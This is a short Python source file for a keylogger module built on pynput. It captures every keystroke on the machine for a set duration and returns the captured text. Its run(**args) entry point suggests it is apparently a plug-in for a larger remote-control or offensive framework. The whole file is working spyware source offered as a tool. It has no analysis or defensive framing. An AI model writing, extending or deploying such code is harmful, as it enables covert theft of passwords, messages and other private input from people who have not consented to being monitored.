from pynput.keyboard import Key, Listener
import time
import json
import threading

# Global log to store keystrokes
log = []

def on_press(key):
    global log
    try:
        log.append(str(key.char))
    except AttributeError:
        if key == Key.space:
            log.append(" ")
        elif key == Key.enter:
            log.append("\n")
        else:
            log.append(f"[{str(key)}]")

def run(**args):
    """Starts a keylogger for a specified duration."""
    duration = args.get("duration", 30) # Default 30 seconds
    print(f"[*] In keylogger module. Logging for {duration} seconds...")
    
    global log
    log = []
    
    with Listener(on_press=on_press) as listener:
        # Start the listener in the background or just join with a timeout
        # Since we are in a module run function, we can just sleep then stop
        time.sleep(duration)
        listener.stop()
    
    result = "".join(log)
    return result
